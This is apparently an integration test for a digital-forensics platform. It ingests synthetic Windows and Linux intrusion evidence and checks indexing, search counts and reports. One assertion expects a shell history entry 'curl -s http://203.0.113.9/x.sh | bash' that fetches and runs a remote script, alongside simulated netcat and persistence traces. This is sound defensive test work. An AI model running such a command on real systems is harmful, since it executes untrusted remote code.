"""Evidence ingest end to end against real PostgreSQL, OpenSearch and Redis.

The unit tests replace the database with SQLite and OpenSearch with fakes, so they cannot see a
field missing from the index mapping, a query PostgreSQL rejects, a job that never runs, or
events indexed twice. This test does what an analyst does: create a case, upload evidence through
the API, let the worker process the queue, then read the results back through the API.

It runs only with ``KAIRON_INTEGRATION=1`` and the services reachable (the ``integration`` CI job
starts them); the regular test run skips it.

When a parser or the demo pack changes on purpose, the expected counts below change with it:
update them in the same pull request.
"""

from __future__ import annotations

import importlib.util
import os
from pathlib import Path

import pytest

pytestmark = pytest.mark.skipif(os.getenv("KAIRON_INTEGRATION") != "1", reason="set KAIRON_INTEGRATION=1 and start PostgreSQL, OpenSearch and Redis")

REPO_ROOT = Path(__file__).resolve().parents[3]
QUEUES = ["dfir-ingest", "dfir-rules", "dfir-analysis"]

# What the demo pack (tools/demo/generate_demo_evidence.py) yields, by artifact type.
WINDOWS_EXPECTED = {
    "windows_ui": 19, "user_activity": 8, "ntfs": 6, "browser": 5, "process": 4, "usn": 3, "dns": 2, "generic_csv": 2,
    "recycle_bin": 2, "cloud": 1, "detection": 1, "mft": 1, "powershell": 1, "registry": 1, "usb": 1,
}
LINUX_FIXED = {"linux_os_info": 3, "linux_timezone": 1}
HOSTS = {"windows": "test-win10-01", "linux": "web01", "collection": "WS01"}


def _load(name: str, path: Path):
    # By file path: tests/ is not a package, and this keeps sys.path untouched.
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def _demo_pack(path: Path) -> Path:
    return _load("generate_demo_evidence", REPO_ROOT / "tools" / "demo" / "generate_demo_evidence.py").generate_demo_evidence(path)


def build_linux_collection(path: Path) -> dict:
    return _load("synthetic_linux", Path(__file__).with_name("synthetic_linux.py")).build(path)


def build_velociraptor_collection(path: Path) -> dict:
    return _load("synthetic_velociraptor", Path(__file__).with_name("synthetic_velociraptor.py")).build(path)


def _run_worker() -> None:
    """Process every queued job in this process, the way the worker container does, then return."""
    from redis import Redis
    from rq import SimpleWorker

    from app.core.config import get_settings

    SimpleWorker(QUEUES, connection=Redis.from_url(get_settings().redis_url)).work(burst=True)


@pytest.fixture(scope="module")
def pipeline(tmp_path_factory):
    from fastapi.testclient import TestClient

    from app.main import app

    workdir = tmp_path_factory.mktemp("ingest")
    windows_zip = _demo_pack(workdir / "test-win10-01.zip")
    linux_tar = workdir / "web01-triage.tar.gz"
    linux_expected = {**build_linux_collection(linux_tar), **LINUX_FIXED}
    collection_zip = workdir / "ws01-collection.zip"
    collection_expected = build_velociraptor_collection(collection_zip)

    with TestClient(app) as client:
        response = client.post("/api/cases", json={"name": "integration: ingest pipeline"})
        assert response.status_code == 201, response.text
        case_id = response.json()["id"]
        evidences = {}
        uploads = (("windows", windows_zip, "application/zip"), ("linux", linux_tar, "application/gzip"), ("collection", collection_zip, "application/zip"))
        for platform, path, content_type in uploads:
            with path.open("rb") as handle:
                response = client.post(f"/api/cases/{case_id}/evidences/upload", files={"file": (path.name, handle, content_type)})
            assert response.status_code == 201, response.text
            evidences[platform] = response.json()["id"]
        _run_worker()
        # A Velociraptor collection is discovered first and waits for the analyst's selection, as in
        # the evidence wizard; then the selected artifacts are ingested.
        response = client.post("/api/velociraptor/parse", json={"evidence_id": evidences["collection"], "parse_all": True, "provided_host": HOSTS["collection"]})
        assert response.status_code == 200, response.text
        _run_worker()
        yield {
            "client": client,
            "case_id": case_id,
            "evidences": evidences,
            "expected": {"windows": WINDOWS_EXPECTED, "linux": linux_expected, "collection": collection_expected},
        }


def _search(pipeline, q: str = "", **params) -> dict:
    response = pipeline["client"].get(f"/api/cases/{pipeline['case_id']}/search", params={"q": q, "page_size": 50, **params})
    assert response.status_code == 200, response.text
    return response.json()


def _artifact_types(pipeline, evidence_id: str) -> dict:
    response = pipeline["client"].get("/api/search/facets", params={"case_id": pipeline["case_id"], "evidence_id": evidence_id})
    assert response.status_code == 200, response.text
    return response.json()["artifact.type"]


@pytest.mark.parametrize("platform", ["windows", "linux", "collection"])
def test_every_evidence_completes_and_indexes_exactly_what_it_contains(pipeline, platform):
    evidence_id = pipeline["evidences"][platform]
    evidence = pipeline["client"].get(f"/api/evidences/{evidence_id}").json()
    expected = pipeline["expected"][platform]

    assert evidence["ingest_status"] == "completed", evidence.get("metadata_json", {}).get("status_reason")
    # Nothing dropped and nothing indexed twice, per artifact type.
    assert _artifact_types(pipeline, evidence_id) == expected
    assert _search(pipeline, evidence_id=evidence_id)["total"] == sum(expected.values())
    assert evidence["metadata_json"]["events_indexed"] == sum(expected.values())


def test_case_views_agree_on_the_number_of_events(pipeline):
    client, case_id = pipeline["client"], pipeline["case_id"]
    total = sum(sum(counts.values()) for counts in pipeline["expected"].values())

    assert _search(pipeline)["total"] == total
    timeline = client.get(f"/api/cases/{case_id}/timeline", params={"page_size": 50}).json()
    assert timeline["total"] == total
    context = client.get(f"/api/cases/{case_id}/context").json()
    assert context["summary"]["events_indexed"] == total
    assert sorted(host["canonical_name"].lower() for host in context["hosts"]) == sorted(name.lower() for name in HOSTS.values())


@pytest.mark.parametrize(
    "query, expected",
    [
        # Windows event log fields and shortcuts (dynamic:false mapping: unmapped fields are not searchable).
        ("eventid:4688", 4),
        ("channel:Security", 4),
        ("eventid:4104 provider:*PowerShell*", 1),
        ("process:powershell.exe", 3),
        # Linux authentication, classified from real log formats.
        ("action:sudo_command", 1),
        ("action:sudo_failed", 1),
        ("action:max_auth_attempts", 1),
        ("action:console_login", 1),
        ("runas:root", 2),
        ("ip:203.0.113.9", 5),
        ("process:sshd", 8),
        ("package:netcat*", 2),
    ],
)
def test_searches_find_what_was_ingested(pipeline, query, expected):
    assert _search(pipeline, query)["total"] == expected


def test_linux_times_get_their_year_and_zone_from_the_collection(pipeline):
    # auth.log lines have no year or zone: the year comes from the files and wtmp, the zone from /etc/timezone.
    results = _search(pipeline, "action:sudo_command")["results"]
    assert results[0]["timestamp"].startswith("2024-03-03T10:02:10")


def test_a_scheduled_task_runs_as_its_principal_not_as_system(pipeline):
    # Every task file lives under System32\\Tasks; the scope must come from the task's principal.
    results = _search(pipeline, "artifact.type:scheduled_task")["results"]
    assert len(results) == 1
    persistence = results[0]["raw"]["persistence"]
    assert (persistence["scope"], persistence["path"]) == ("user", "C:\\Users\\Public\\updater.exe")


def test_command_history_includes_shell_history(pipeline):
    response = pipeline["client"].get(f"/api/cases/{pipeline['case_id']}/command-history", params={"page_size": 100})
    assert response.status_code == 200, response.text
    commands = [str(item.get("command") or item.get("command_line") or "") for item in response.json()["items"]]
    assert any("curl -s http://203.0.113.9/x.sh | bash" in command for command in commands)


def test_report_preview_builds_from_indexed_data(pipeline):
    client, case_id = pipeline["client"], pipeline["case_id"]
    draft = client.post(f"/api/cases/{case_id}/reports/draft", json={})
    assert draft.status_code == 201, draft.text
    preview = client.get(f"/api/cases/{case_id}/reports/{draft.json()['id']}/preview")
    assert preview.status_code == 200, preview.text
    sections = {section["id"] for section in preview.json()["sections"]}
    assert {"evidence", "hosts", "timeline", "command_history"} <= sections


def test_reprocessing_does_not_duplicate_events(pipeline):
    client = pipeline["client"]
    for platform, evidence_id in pipeline["evidences"].items():
        response = client.post(f"/api/evidences/{evidence_id}/reprocess", json={"mode": "previous_selection", "provided_host": HOSTS[platform]})
        assert response.status_code == 200, response.text
    _run_worker()
    for platform, evidence_id in pipeline["evidences"].items():
        evidence = client.get(f"/api/evidences/{evidence_id}").json()
        assert evidence["ingest_status"] == "completed"
        assert _artifact_types(pipeline, evidence_id) == pipeline["expected"][platform]
